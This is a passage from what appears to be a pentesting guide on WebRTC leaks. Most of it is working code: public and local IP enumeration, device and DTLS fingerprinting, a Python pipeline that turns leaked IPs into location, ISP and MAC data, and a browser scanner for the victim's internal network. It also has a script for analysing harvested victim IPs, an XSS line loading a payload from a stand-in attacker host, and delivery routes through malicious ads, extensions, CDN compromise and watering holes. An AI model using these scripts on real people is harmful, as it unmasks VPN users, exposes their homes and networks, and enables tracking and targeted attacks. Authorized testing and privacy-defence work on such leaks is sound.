      pc.createOffer().then(o => pc.setLocalDescription(o));
      
    } catch(e) {
      clearTimeout(timeout);
      resolve({ server: stunUrl, ips: [], error: e.message });
    }
  });
}

async function enumerateAllSTUN() {
  console.log(`[*] Testing ${STUN_SERVERS.length} STUN servers...`);
  
  const results = await Promise.all(
    STUN_SERVERS.map(s => testSTUNServer(s))
  );
  
  const allIPs = new Set();
  console.log('\n=== STUN Server Results ===');
  
  results.forEach(r => {
    if (r.ips.length > 0) {
      console.log(`[+] ${r.server}: ${r.ips.join(', ')}`);
      r.ips.forEach(ip => allIPs.add(ip));
    } else {
      console.log(`[-] ${r.server}: No IPs (${r.error || 'timeout'})`);
    }
  });
  
  console.log('\n=== All Unique IPs ===');
  console.log([...allIPs].join('\n'));
  
  return { allIPs: [...allIPs], details: results };
}

enumerateAllSTUN();
```

::

---

## Browser Fingerprinting via WebRTC

Beyond IP leakage, WebRTC exposes **rich fingerprinting data** that creates a unique identifier for each browser instance.

### Media Device Fingerprinting

::tabs
  :::tabs-item{icon="i-lucide-code" label="Device Enumeration"}
  ```javascript [media-device-fingerprint.js]
  // WebRTC Media Device Fingerprinting
  // enumerateDevices() reveals connected audio/video devices
  // Device IDs persist across sessions (until cleared)

  async function fingerprintDevices() {
    const fingerprint = {
      devices: [],
      device_count: { audio_input: 0, audio_output: 0, video_input: 0 },
      device_hash: '',
      codec_support: [],
      media_capabilities: {}
    };

    // 1. Enumerate media devices
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      
      devices.forEach(device => {
        fingerprint.devices.push({
          kind: device.kind,
          label: device.label || 'unknown',
          // deviceId is persistent per origin until user clears data
          deviceId: device.deviceId,
          groupId: device.groupId
        });
        
        if (device.kind === 'audioinput') fingerprint.device_count.audio_input++;
        if (device.kind === 'audiooutput') fingerprint.device_count.audio_output++;
        if (device.kind === 'videoinput') fingerprint.device_count.video_input++;
      });
    } catch(e) {
      fingerprint.devices_error = e.message;
    }

    // 2. Get supported codecs
    if (window.RTCRtpSender && RTCRtpSender.getCapabilities) {
      try {
        const audioCodecs = RTCRtpSender.getCapabilities('audio');
        const videoCodecs = RTCRtpSender.getCapabilities('video');
        
        fingerprint.codec_support = {
          audio: audioCodecs ? audioCodecs.codecs.map(c => c.mimeType) : [],
          video: videoCodecs ? videoCodecs.codecs.map(c => c.mimeType) : []
        };
      } catch(e) {}
    }

    // 3. Check media capabilities
    if (navigator.mediaCapabilities) {
      try {
        const h264 = await navigator.mediaCapabilities.decodingInfo({
          type: 'file',
          video: { contentType: 'video/mp4; codecs="avc1.42E01E"', width: 1920, height: 1080, bitrate: 5000000, framerate: 30 }
        });
        fingerprint.media_capabilities.h264_1080p = h264;
        
        const vp9 = await navigator.mediaCapabilities.decodingInfo({
          type: 'file',
          video: { contentType: 'video/webm; codecs="vp9"', width: 3840, height: 2160, bitrate: 20000000, framerate: 60 }
        });
        fingerprint.media_capabilities.vp9_4k = vp9;
      } catch(e) {}
    }

    // 4. Create fingerprint hash
    const data = JSON.stringify(fingerprint.device_count) + 
                 JSON.stringify(fingerprint.codec_support);
    
    // Simple hash for fingerprinting
    let hash = 0;
    for (let i = 0; i < data.length; i++) {
      const char = data.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    fingerprint.device_hash = Math.abs(hash).toString(36);

    console.log('=== WebRTC Device Fingerprint ===');
    console.log(JSON.stringify(fingerprint, null, 2));
    
    return fingerprint;
  }

  fingerprintDevices();
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Fingerprint Components"}
  ```text [fingerprint-components.txt]
  WebRTC FINGERPRINT COMPONENTS:
  ══════════════════════════════
  
  1. MEDIA DEVICES
     ├── Number of audio inputs (microphones)
     ├── Number of audio outputs (speakers)
     ├── Number of video inputs (cameras)
     ├── Device IDs (persistent per origin)
     ├── Group IDs (devices from same hardware)
     └── Device labels (after permission grant)
  
  2. CODEC SUPPORT
     ├── Audio codecs (opus, PCMU, PCMA, G722, etc.)
     ├── Video codecs (VP8, VP9, H.264, H.265, AV1)
     ├── Codec parameters (profile-level-id, etc.)
     └── Hardware acceleration capabilities
  
  3. SDP FINGERPRINT
     ├── DTLS fingerprint algorithm (sha-256, sha-1)
     ├── ICE credentials (ufrag, pwd format)
     ├── BUNDLE support
     ├── RTCP-mux support
     ├── Media direction capabilities
     └── SSRC generation patterns
  
  4. NETWORK CHARACTERISTICS
     ├── IP addresses (local + public)
     ├── Port allocation patterns
     ├── NAT type (full cone, restricted, symmetric)
     ├── ICE candidate priority values
     └── STUN response timing
  
  5. DTLS CERTIFICATE
     ├── Certificate fingerprint (unique per browser instance)
     ├── Certificate algorithm
     └── Certificate expiration
  
  ENTROPY: Combined, these create a fingerprint with
           ~33 bits of entropy — enough to uniquely identify
           most browsers in a pool of millions.
  ```
  :::
::

### DTLS Certificate Fingerprinting

::code-collapse

```javascript [dtls-fingerprint.js]
// DTLS Certificate Fingerprinting
// Each browser instance generates a unique DTLS certificate
// This certificate fingerprint persists across sessions
// and is exposed in the SDP offer

async function extractDTLSFingerprint() {
  const pc = new RTCPeerConnection();
  
  // Add a transceiver to generate media-related SDP
  try {
    pc.addTransceiver('audio');
    pc.addTransceiver('video');
  } catch(e) {
    // Fallback for older browsers
    pc.createDataChannel('fingerprint');
  }
  
  const offer = await pc.createOffer();
  const sdp = offer.sdp;
  
  // Extract DTLS fingerprint
  const fingerprintMatch = sdp.match(/a=fingerprint:(\S+)\s+(\S+)/);
  const setupMatch = sdp.match(/a=setup:(\S+)/);
  const iceUfragMatch = sdp.match(/a=ice-ufrag:(\S+)/);
  const icePwdMatch = sdp.match(/a=ice-pwd:(\S+)/);
  
  const result = {
    dtls_fingerprint: fingerprintMatch ? {
      algorithm: fingerprintMatch[1],  // e.g., sha-256
      value: fingerprintMatch[2]       // Unique per browser instance!
    } : null,
    dtls_setup: setupMatch ? setupMatch[1] : null,
    ice_ufrag_format: iceUfragMatch ? iceUfragMatch[1] : null,
    ice_pwd_length: icePwdMatch ? icePwdMatch[1].length : null,
    
    // Additional SDP fingerprinting data
    bundle_support: sdp.includes('a=group:BUNDLE'),
    rtcp_mux: sdp.includes('a=rtcp-mux'),
    rtcp_rsize: sdp.includes('a=rtcp-rsize'),
    ice_options: sdp.match(/a=ice-options:(.+)/)?.[1],
    
    // Codec order (browser-specific)
    audio_codecs: [...sdp.matchAll(/a=rtpmap:\d+ (\S+)/g)].map(m => m[1]),
    
    // EXTMAP (RTP header extensions — varies by browser)
    extensions: [...sdp.matchAll(/a=extmap:\d+ (\S+)/g)].map(m => m[1])
  };
  
  console.log('=== DTLS Certificate Fingerprint ===');
  console.log('Algorithm:', result.dtls_fingerprint?.algorithm);
  console.log('Fingerprint:', result.dtls_fingerprint?.value);
  console.log('\n=== SDP Fingerprint Data ===');
  console.log(JSON.stringify(result, null, 2));
  
  pc.close();
  return result;
}

extractDTLSFingerprint();
```

::

### NAT Type Detection

::tabs
  :::tabs-item{icon="i-lucide-code" label="NAT Type Discovery"}
  ```javascript [nat-type-detection.js]
  // Detect NAT type via WebRTC ICE candidate analysis
  // NAT type reveals network topology information

  async function detectNATType() {
    const candidates = [];
    
    const pc = new RTCPeerConnection({
      iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun1.l.google.com:19302' },
        { urls: 'stun:stun2.l.google.com:19302' }
      ]
    });

    return new Promise((resolve) => {
      const timeout = setTimeout(() => analyzeAndResolve(), 8000);
      
      pc.onicecandidate = function(event) {
        if (!event.candidate) {
          clearTimeout(timeout);
          analyzeAndResolve();
          return;
        }
        candidates.push(event.candidate.candidate);
      };

      pc.createDataChannel('nat-detect');
      pc.createOffer().then(o => pc.setLocalDescription(o));

      function analyzeAndResolve() {
        const analysis = {
          nat_type: 'Unknown',
          host_candidates: [],
          srflx_candidates: [],
          relay_candidates: [],
          port_mapping: [],
          likely_nat: ''
        };

        candidates.forEach(c => {
          const ipMatch = c.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+(\d+)\s+typ\s+(\w+)/);
          if (ipMatch) {
            const entry = { ip: ipMatch[1], port: parseInt(ipMatch[2]), type: ipMatch[3] };
            
            if (entry.type === 'host') analysis.host_candidates.push(entry);
            if (entry.type === 'srflx') analysis.srflx_candidates.push(entry);
            if (entry.type === 'relay') analysis.relay_candidates.push(entry);
          }
        });

        // Analyze NAT behavior
        const srflxPorts = analysis.srflx_candidates.map(c => c.port);
        const hostPorts = analysis.host_candidates.map(c => c.port);
        
        if (analysis.srflx_candidates.length === 0 && analysis.host_candidates.length > 0) {
          // No STUN response — symmetric NAT or UDP blocked
          analysis.nat_type = 'Symmetric NAT or UDP Filtered';
          analysis.likely_nat = 'Restrictive — may indicate corporate network';
        } else if (srflxPorts.length > 0) {
          const uniqueSrflxIPs = [...new Set(analysis.srflx_candidates.map(c => c.ip))];
          
          if (uniqueSrflxIPs.length === 1) {
            // Same public IP from all STUN servers
            if (srflxPorts.every(p => hostPorts.includes(p))) {
              analysis.nat_type = 'No NAT (Direct)';
              analysis.likely_nat = 'Server or directly connected device';
            } else {
              const portSpread = Math.max(...srflxPorts) - Math.min(...srflxPorts);
              if (portSpread < 10) {
                analysis.nat_type = 'Full Cone NAT (EIM)';
                analysis.likely_nat = 'Home router — most permissive NAT';
              } else {
                analysis.nat_type = 'Restricted/Port-Restricted NAT';
                analysis.likely_nat = 'Standard home/office NAT';
              }
            }
          } else {
            analysis.nat_type = 'Symmetric NAT';
            analysis.likely_nat = 'Corporate network or carrier-grade NAT';
          }
        }

        console.log('=== NAT Type Detection ===');
        console.log('NAT Type:', analysis.nat_type);
        console.log('Assessment:', analysis.likely_nat);
        console.log('Host IPs:', analysis.host_candidates.map(c => c.ip + ':' + c.port));
        console.log('Public IPs:', analysis.srflx_candidates.map(c => c.ip + ':' + c.port));
        
        pc.close();
        resolve(analysis);
      }
    });
  }

  detectNATType();
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="NAT Type Implications"}
  ```text [nat-type-implications.txt]
  NAT TYPE → INTELLIGENCE VALUE:
  ══════════════════════════════
  
  FULL CONE NAT (Endpoint Independent Mapping)
  ├── Typical: Home routers, consumer ISPs
  ├── Intelligence: Residential user, single household
  └── P2P: Direct connection possible
  
  RESTRICTED CONE NAT
  ├── Typical: Better home routers, small office
  ├── Intelligence: Standard consumer/SOHO setup
  └── P2P: Requires initial outbound packet
  
  PORT-RESTRICTED CONE NAT  
  ├── Typical: Modern routers, enterprise edge
  ├── Intelligence: Security-conscious network
  └── P2P: Requires exact port matching
  
  SYMMETRIC NAT
  ├── Typical: Corporate firewalls, carrier-grade NAT (CGNAT)
  ├── Intelligence: Corporate/enterprise environment or mobile ISP
  ├── Multiple public IPs per STUN server = DEFINITIVE indicator
  └── P2P: Very difficult, TURN relay usually required
  
  NO NAT (Direct)
  ├── Typical: Servers, VPS, some fiber ISPs
  ├── Intelligence: Likely a server or hosted environment
  └── Local IP = Public IP
  
  UDP BLOCKED
  ├── Typical: Strict corporate firewalls, captive portals
  ├── Intelligence: Restrictive enterprise environment
  └── WebRTC STUN fails entirely — but this itself is intel
  ```
  :::
::

---

## Privilege Escalation via WebRTC Leakage

::caution
WebRTC leakage enables **privilege escalation** not in the traditional sense of gaining system-level access, but by **escalating from anonymous/pseudonymous identity to real-world identity** — which in many threat models is the most critical escalation possible.
::

### De-Anonymization Attack Chain

::tabs
  :::tabs-item{icon="i-lucide-info" label="Attack Chain"}
  ```text [deanon-attack-chain.txt]
  DE-ANONYMIZATION PRIVILEGE ESCALATION:
  ═══════════════════════════════════════
  
  STARTING POINT:
  └── Anonymous user behind VPN/Proxy/Tor
      └── Known only as: "VPN IP 198.51.100.1"
  
  STEP 1: WebRTC IP LEAK
  └── Discover real IP: 203.0.113.50
  └── Discover local IP: 192.168.1.105
  └── Discover IPv6: 2001:db8::1a2b:3c4d:5e6f
  
  STEP 2: IP → ISP IDENTIFICATION
  └── WHOIS: Comcast Cable Communications
  └── ASN: AS7922
  └── Region: Portland, Oregon, USA
  
  STEP 3: IP → GEOLOCATION
  └── MaxMind GeoIP2: 45.5231° N, 122.6765° W
  └── City: Portland, OR
  └── Accuracy: ~5km radius
  
  STEP 4: IPv6 → DEVICE MAC
  └── EUI-64 extraction: 00:1A:2B:3C:4D:5E
  └── OUI Lookup: Apple, Inc.
  └── Device: MacBook Pro
  
  STEP 5: LOCAL IP → NETWORK TOPOLOGY
  └── 192.168.1.105 on 192.168.1.0/24
  └── Gateway likely: 192.168.1.1
  └── Router: Netgear Nighthawk (via router fingerprinting)
  
  STEP 6: CORRELATE WITH OTHER DATA
  └── Same real IP seen on social media (no VPN)
  └── Match with data broker records
  └── Physical address from ISP records (legal process)
  
  RESULT:
  └── Anonymous user → John Smith, 1234 Oak Street, Portland, OR
  └── Using MacBook Pro on Netgear router via Comcast
  └── COMPLETE DE-ANONYMIZATION ✓
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Automated De-Anon Script"}
  ```python [deanon-pipeline.py]
  #!/usr/bin/env python3
  """
  De-Anonymization Pipeline
  Takes WebRTC-leaked IP and performs full intelligence gathering
  """

  import requests
  import json
  import ipaddress

  class DeAnonymizer:
      def __init__(self, leaked_ip):
          self.ip = leaked_ip
          self.intel = {
              'ip': leaked_ip,
              'is_private': False,
              'geolocation': {},
              'isp': {},
              'reverse_dns': '',
              'open_ports': [],
              'threat_intel': {},
              'ipv6_mac': None
          }

      def classify_ip(self):
          """Determine if IP is private, VPN, or real"""
          try:
              addr = ipaddress.ip_address(self.ip)
              self.intel['is_private'] = addr.is_private
              self.intel['is_loopback'] = addr.is_loopback
              self.intel['is_link_local'] = addr.is_link_local
              self.intel['ip_version'] = addr.version
          except ValueError:
              pass

      def geolocate(self):
          """Get geolocation from multiple free APIs"""
          apis = [
              f'http://ip-api.com/json/{self.ip}',
              f'https://ipapi.co/{self.ip}/json/',
              f'https://ipwho.is/{self.ip}'
          ]
          
          for api in apis:
              try:
                  resp = requests.get(api, timeout=5)
                  data = resp.json()
                  if resp.status_code == 200:
                      self.intel['geolocation'] = data
                      break
              except:
                  continue

      def isp_lookup(self):
          """Get ISP and ASN information"""
          try:
              resp = requests.get(
                  f'https://ipinfo.io/{self.ip}/json',
                  timeout=5
              )
              if resp.status_code == 200:
                  self.intel['isp'] = resp.json()
          except:
              pass

      def reverse_dns(self):
          """Reverse DNS lookup"""
          import socket
          try:
              hostname = socket.gethostbyaddr(self.ip)
              self.intel['reverse_dns'] = hostname[0]
          except:
              self.intel['reverse_dns'] = 'No PTR record'

      def check_vpn_proxy(self):
          """Check if the IP belongs to known VPN/proxy providers"""
          try:
              resp = requests.get(
                  f'https://proxycheck.io/v2/{self.ip}?vpn=1&asn=1',
                  timeout=5
              )
              if resp.status_code == 200:
                  self.intel['vpn_check'] = resp.json()
          except:
              pass

      def extract_mac_from_ipv6(self):
          """Extract MAC address from EUI-64 IPv6 address"""
          if ':' not in self.ip:
              return
          
          try:
              addr = ipaddress.IPv6Address(self.ip)
              # Get interface identifier (last 64 bits)
              packed = addr.packed
              iid = packed[8:16]
              
              # Check for EUI-64 marker (ff:fe in bytes 3-4)
              if iid[3] == 0xff and iid[4] == 0xfe:
                  # Extract and reconstruct MAC
                  mac_bytes = [
                      iid[0] ^ 0x02,  # Flip universal/local bit
                      iid[1],
                      iid[2],
                      iid[5],
                      iid[6],
                      iid[7]
                  ]
                  mac = ':'.join(f'{b:02x}' for b in mac_bytes)
                  
                  # OUI lookup
                  oui = ':'.join(f'{b:02x}' for b in mac_bytes[:3])
                  
                  self.intel['ipv6_mac'] = {
                      'mac_address': mac,
                      'oui': oui,
                      'manufacturer': self.lookup_oui(oui)
                  }
          except:
              pass

      def lookup_oui(self, oui):
          """Look up manufacturer from OUI"""
          try:
              resp = requests.get(
                  f'https://api.macvendors.com/{oui}',
                  timeout=5
              )
              return resp.text if resp.status_code == 200 else 'Unknown'
          except:
              return 'Unknown'

      def run_full_pipeline(self):
          """Execute complete de-anonymization pipeline"""
          print(f"[*] De-Anonymization Pipeline for: {self.ip}")
          print("=" * 50)
          
          self.classify_ip()
          print(f"[1] IP Classification: {'Private' if self.intel['is_private'] else 'Public'}")
          
          if not self.intel['is_private']:
              self.geolocate()
              geo = self.intel['geolocation']
              print(f"[2] Geolocation: {geo.get('city', 'N/A')}, "
                    f"{geo.get('region', 'N/A')}, {geo.get('country', 'N/A')}")
              
              self.isp_lookup()
              isp = self.intel['isp']
              print(f"[3] ISP: {isp.get('org', 'N/A')}")
              
              self.reverse_dns()
              print(f"[4] Reverse DNS: {self.intel['reverse_dns']}")
              
              self.check_vpn_proxy()
              print(f"[5] VPN/Proxy Check: {self.intel.get('vpn_check', 'N/A')}")
          
          self.extract_mac_from_ipv6()
          if self.intel['ipv6_mac']:
              mac_info = self.intel['ipv6_mac']
              print(f"[6] MAC Address: {mac_info['mac_address']}")
              print(f"    Manufacturer: {mac_info['manufacturer']}")
          
          print("\n[*] Full Intel Report:")
          print(json.dumps(self.intel, indent=2, default=str))
          
          return self.intel

  # Usage
  if __name__ == '__main__':
      # From WebRTC leak
      leaked_public_ip = '203.0.113.50'
      leaked_ipv6 = '2001:db8::021a:2bff:fe3c:4d5e'
      
      print("=== PUBLIC IP ANALYSIS ===")
      deanon = DeAnonymizer(leaked_public_ip)
      deanon.run_full_pipeline()
      
      print("\n=== IPv6 ANALYSIS ===")
      deanon6 = DeAnonymizer(leaked_ipv6)
      deanon6.run_full_pipeline()
  ```
  :::
::

### PrivEsc — Internal Network Reconnaissance

::code-collapse

```javascript [internal-network-recon.js]
// Once local IPs are leaked via WebRTC, 
// use them to map the internal network from the browser

async function internalNetworkRecon(leakedLocalIP) {
  console.log(`[*] Starting internal network recon from: ${leakedLocalIP}`);
  
  // Extract subnet from leaked IP
  const parts = leakedLocalIP.split('.');
  const subnet = parts.slice(0, 3).join('.');
  
  const results = {
    leaked_ip: leakedLocalIP,
    subnet: subnet + '.0/24',
    alive_hosts: [],
    web_servers: [],
    common_services: []
  };

  // 1. Scan subnet for alive hosts using image loading timing
  console.log(`[*] Scanning ${subnet}.0/24 for alive hosts...`);
  
  const scanPromises = [];
  for (let i = 1; i <= 254; i++) {
    const targetIP = `${subnet}.${i}`;
    scanPromises.push(probeHost(targetIP));
  }
  
  const scanResults = await Promise.allSettled(scanPromises);
  scanResults.forEach((result, i) => {
    if (result.status === 'fulfilled' && result.value.alive) {
      results.alive_hosts.push(result.value);
    }
  });

  // 2. Check common web ports on alive hosts
  console.log(`[*] Found ${results.alive_hosts.length} alive hosts`);
  console.log(`[*] Scanning for web servers...`);
  
  const webPorts = [80, 443, 8080, 8443, 8888, 3000, 5000, 9090];
  for (const host of results.alive_hosts) {
    for (const port of webPorts) {
      const hasWeb = await probeWebServer(host.ip, port);
      if (hasWeb) {
        results.web_servers.push({ ip: host.ip, port: port });
      }
    }
  }

  // 3. Check for common internal services
  const commonTargets = [
    { ip: subnet + '.1', name: 'Default Gateway / Router' },
    { ip: subnet + '.1', name: 'Router Admin Panel', port: 80 },
    { ip: '192.168.1.1', name: 'Common Router' },
    { ip: '10.0.0.1', name: 'Alternative Gateway' },
    { ip: subnet + '.100', name: 'DHCP Server (common)' },
    { ip: subnet + '.2', name: 'Secondary DNS/DC' }
  ];
  
  for (const target of commonTargets) {
    const alive = await probeHost(target.ip);
    if (alive.alive) {
      results.common_services.push(target);
    }
  }

  console.log('\n=== Internal Network Recon Results ===');
  console.log(JSON.stringify(results, null, 2));
  return results;
}

function probeHost(ip) {
  return new Promise((resolve) => {
    const start = performance.now();
    const img = new Image();
    
    const timeout = setTimeout(() => {
      img.src = '';
      resolve({ ip: ip, alive: false, time: -1 });
    }, 1000);

    img.onload = img.onerror = function() {
      clearTimeout(timeout);
      const elapsed = performance.now() - start;
      // Fast error = host exists but port closed
      // Timeout = host doesn't exist
      resolve({ ip: ip, alive: elapsed < 500, time: elapsed });
    };

    img.src = `http://${ip}:${1 + Math.floor(Math.random() * 65534)}/${Math.random()}`;
  });
}

function probeWebServer(ip, port) {
  return new Promise((resolve) => {
    const timeout = setTimeout(() => resolve(false), 2000);
    
    const img = new Image();
    img.onload = function() {
      clearTimeout(timeout);
      resolve(true);
    };
    img.onerror = function() {
      clearTimeout(timeout);
      // Error within 500ms likely means server exists but rejected
      resolve(true);
    };
    
    img.src = `http://${ip}:${port}/favicon.ico?${Math.random()}`;
  });
}

// Run with leaked WebRTC local IP
// internalNetworkRecon('192.168.1.105');
```

::

### PrivEsc — Correlating WebRTC Leaks with Other Attacks

::tabs
  :::tabs-item{icon="i-lucide-info" label="Cross-Attack Correlation"}
  ```text [correlation-attacks.txt]
  COMBINING WebRTC LEAKS WITH OTHER ATTACKS:
  ═══════════════════════════════════════════
  
  1. WebRTC + DNS REBINDING
     ───────────────────────
     Leaked local IP → Know target's internal IP
     DNS rebinding → Resolve attacker domain to internal IP
     Result: Access internal services from attacker's page
  
  2. WebRTC + CSRF
     ──────────────
     Leaked local IP 192.168.1.1 → Router admin panel
     CSRF payload → Change DNS settings on router
     Result: DNS hijacking of entire network
  
  3. WebRTC + SSRF
     ──────────────
     Leaked local IP → Know internal network range
     SSRF vulnerability → Target internal services
     Result: Access internal APIs, databases, admin panels
  
  4. WebRTC + BROWSER EXPLOITATION
     ─────────────────────────────
     Leaked IP → Identify ISP and region
     Leaked local IP → Identify router model
     Target router CVEs → Compromise router
     Result: Network-level MitM
  
  5. WebRTC + SOCIAL ENGINEERING
     ───────────────────────────
     Leaked IP → Physical location
     Leaked MAC → Device type
     Leaked network topology → Corporate vs personal
     Result: Highly targeted phishing campaign
  
  6. WebRTC + TRACKING
     ─────────────────
     User uses VPN to be "anonymous"
     WebRTC leaks real IP on attacker's page
     Same real IP seen on social media without VPN
     Result: Link anonymous activity to real identity
  ```
  :::
::

---

## Pentesting Methodology

::steps{level="4"}

#### Reconnaissance — Identify WebRTC Usage

```text [recon-checklist.txt]
WebRTC RECONNAISSANCE CHECKLIST:
════════════════════════════════

Application Analysis:
☐ Does the application use WebRTC? (video calls, screen sharing, etc.)
☐ Search source code for RTCPeerConnection, getUserMedia
☐ Check for WebRTC JavaScript libraries (adapter.js, PeerJS, SimpleWebRTC)
☐ Look for STUN/TURN server configurations in JS source
☐ Check for WebSocket signaling endpoints

Browser Analysis:
☐ Is WebRTC enabled in target's browser?
☐ Check browser version and mDNS support
☐ Test from multiple browsers (Chrome, Firefox, Safari, Edge)
☐ Test mobile browsers (different WebRTC behavior)

Network Analysis:
☐ Is the target behind a VPN/proxy?
☐ What type of NAT is the target behind?
☐ Are STUN UDP packets blocked by firewall?
☐ Is the target on IPv4 only, IPv6 only, or dual-stack?

Attack Surface:
☐ Can you inject JavaScript into any page the target visits?
☐ XSS vulnerabilities → inject WebRTC leak payload
☐ Compromised ad network → inject via malicious ads
☐ Malicious browser extension → inject on all pages
☐ ARP spoofing / DNS spoofing → inject via MitM
```

#### Discovery — Test for WebRTC Leaks

```bash [discovery-testing.sh]
#!/bin/bash
# Quick WebRTC leak test setup

echo "[*] WebRTC Leak Test Server Setup"

# Create a simple test page
cat > webrtc_test.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head><title>WebRTC Leak Test</title></head>
<body>
<h1>WebRTC Leak Test</h1>
<div id="results"></div>
<script>
var ips = {};
var RTCPeerConnection = window.RTCPeerConnection || 
                        window.mozRTCPeerConnection || 
                        window.webkitRTCPeerConnection;

if (!RTCPeerConnection) {
  document.getElementById('results').innerHTML = 
    '<p style="color:green">WebRTC NOT supported — no leak possible</p>';
} else {
  var pc = new RTCPeerConnection({
    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
  });
  
  pc.createDataChannel('');
  pc.createOffer().then(o => pc.setLocalDescription(o));
  
  pc.onicecandidate = function(e) {
    if (!e.candidate) return;
    var c = e.candidate.candidate;
    var ip = c.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
    if (ip && !ips[ip[1]]) {
      ips[ip[1]] = true;
      var type = c.includes('typ host') ? 'LOCAL' : 
                 c.includes('typ srflx') ? 'PUBLIC' : 'OTHER';
      var div = document.getElementById('results');
      var color = type === 'PUBLIC' ? 'red' : 'orange';
      div.innerHTML += '<p style="color:' + color + '">[' + 
                       type + '] ' + ip[1] + '</p>';
      div.innerHTML += '<pre>' + c + '</pre>';
    }
  };
}
</script>
</body>
</html>
HTMLEOF

# Serve it
echo "[*] Serving test page on port 8080"
python3 -m http.server 8080
```

#### Exploitation — Deploy the Payload

```text [exploitation-methods.txt]
PAYLOAD DELIVERY METHODS:
═════════════════════════

1. XSS INJECTION
   └── Find XSS in target application
   └── Inject WebRTC leak payload
   └── Every user who hits the XSS leaks their IP
   
   <script src="https://attacker.com/webrtc-leak.js"></script>

2. MALICIOUS ADVERTISEMENT
   └── Buy ad space on target website
   └── Ad contains WebRTC leak JavaScript
   └── All ad viewers leak their IPs

3. PHISHING PAGE
   └── Create phishing page impersonating target
   └── Include WebRTC leak payload
   └── Victim visits phishing page → IP leaked

4. BROWSER EXTENSION
   └── Create "useful" browser extension
   └── Extension injects WebRTC leak on all pages
   └── Continuous IP monitoring

5. MAN-IN-THE-MIDDLE
   └── ARP spoofing / DNS spoofing / BGP hijack
   └── Inject WebRTC leak JS into HTTP pages
   └── All HTTP traffic on network → IP leaked

6. COMPROMISED CDN / SUPPLY CHAIN
   └── Compromise a popular JS library CDN
   └── Inject WebRTC leak into widely-used library
   └── Mass IP collection from all sites using the library

7. WATERING HOLE
   └── Identify websites the target visits
   └── Compromise one of those sites
   └── Add WebRTC leak payload
   └── Wait for target to visit
```

#### Analysis — Process Collected Data

```python [analysis-pipeline.py]
#!/usr/bin/env python3
"""
Analyze collected WebRTC leak data
Correlate IPs, identify VPN users, map networks
"""

import json
from collections import defaultdict

def analyze_leaks(log_file='collected_ips.jsonl'):
    entries = []
    with open(log_file) as f:
        for line in f:
            entries.append(json.loads(line))
    
    print(f"[*] Analyzing {len(entries)} leak entries\n")
    
    # Identify VPN users (HTTP source IP != WebRTC public IP)
    vpn_users = []
    for entry in entries:
        http_ip = entry.get('_source_ip')
        webrtc_public = entry.get('ips', {}).get('public', [])
        
        if webrtc_public and http_ip not in webrtc_public:
            vpn_users.append({
                'vpn_ip': http_ip,
                'real_ip': webrtc_public,
                'local_ips': entry.get('ips', {}).get('local', []),
                'user_agent': entry.get('user_agent'),
                'page': entry.get('page_url'),
                'time': entry.get('timestamp')
            })
    
    print(f"[+] VPN Users Detected: {len(vpn_users)}")
    for user in vpn_users:
        print(f"    VPN IP: {user['vpn_ip']}")
        print(f"    REAL IP: {user['real_ip']}")
        print(f"    Local: {user['local_ips']}")
        print(f"    UA: {user['user_agent'][:60]}")
        print()
    
    # Group by real IP to find repeat visitors
    ip_visits = defaultdict(list)
    for entry in entries:
        for ip in entry.get('ips', {}).get('public', []):
            ip_visits[ip].append(entry.get('timestamp'))
    
    print(f"\n[+] Unique Real IPs: {len(ip_visits)}")
    for ip, visits in sorted(ip_visits.items(), 
                              key=lambda x: len(x[1]), reverse=True):
        print(f"    {ip}: {len(visits)} visits")

analyze_leaks()
```

#### Reporting — Document the Finding

```text [report-template.txt]
VULNERABILITY: WebRTC IP Address Leakage
SEVERITY: Medium-High (Context Dependent)
AFFECTED: All users with WebRTC enabled browsers
TESTED ON: Chrome 120, Firefox 121, Edge 120

DESCRIPTION:
The application [or: the user's browser configuration] allows 
JavaScript to create RTCPeerConnection objects and enumerate 
ICE candidates without user consent. This exposes the user's 
local (private) IP addresses and, via STUN server reflexive 
candidates, the user's real public IP address — even when the 
user is behind a VPN, proxy, or other anonymization tool.

REPRODUCTION STEPS:
1. Connect to a VPN (verified VPN IP: 198.51.100.X)
2. Navigate to the proof-of-concept page
3. Page creates RTCPeerConnection with Google STUN server
4. ICE candidates reveal:
   - Local IP: 192.168.1.105 (home network)
   - VPN IP: 10.8.0.2 (OpenVPN tunnel)
   - Real Public IP: 203.0.113.50 (ISP-assigned, NOT VPN)
5. VPN is completely bypassed for IP discovery

IMPACT:
- De-anonymization of VPN/proxy users
- Geographic location tracking via real IP
- Internal network enumeration via local IPs
- Device fingerprinting via IPv6 EUI-64 MAC extraction
- Correlation of anonymous activity with real identity
- Internal network topology mapping
```

::

---

## Pentest Notes & Tips

::accordion
  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Browser-Specific WebRTC Behavior
  ---
  | Browser | mDNS Local IP | STUN Public IP | Media Permissions | Notes |
  |---------|:-------------:|:--------------:|:-----------------:|-------|
  | **Chrome 74+** | `.local` hostname | Exposed | Not required | mDNS can be disabled in flags |
  | **Firefox 70+** | `.local` hostname | Exposed | Not required | `media.peerconnection.enabled` pref |
  | **Safari 14+** | Blocked | Restricted | Partially | Stricter WebRTC policies |
  | **Edge (Chromium)** | `.local` hostname | Exposed | Not required | Same as Chrome behavior |
  | **Tor Browser** | Disabled | Disabled | N/A | WebRTC completely disabled |
  | **Brave** | Blocked | Configurable | Not required | Has built-in WebRTC leak protection |
  | **Opera** | `.local` hostname | Exposed | Not required | Has built-in VPN — still leaks! |
  | **Chrome Android** | `.local` hostname | Exposed | Not required | Mobile networks → more identifying |
  | **Firefox Android** | `.local` hostname | Exposed | Not required | Same as desktop Firefox |
  | **Safari iOS** | Restricted | Restricted | Required | Most restrictive mobile browser |
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Maximizing Leak Reliability
  ---
  ```text [maximize-reliability.txt]
  TIPS FOR RELIABLE WebRTC LEAKS:
  ═══════════════════════════════
  
  1. USE MULTIPLE STUN SERVERS
     Don't rely on a single STUN server — it might be blocked.
     Include Google, Mozilla, Twilio, and public STUN servers.
  
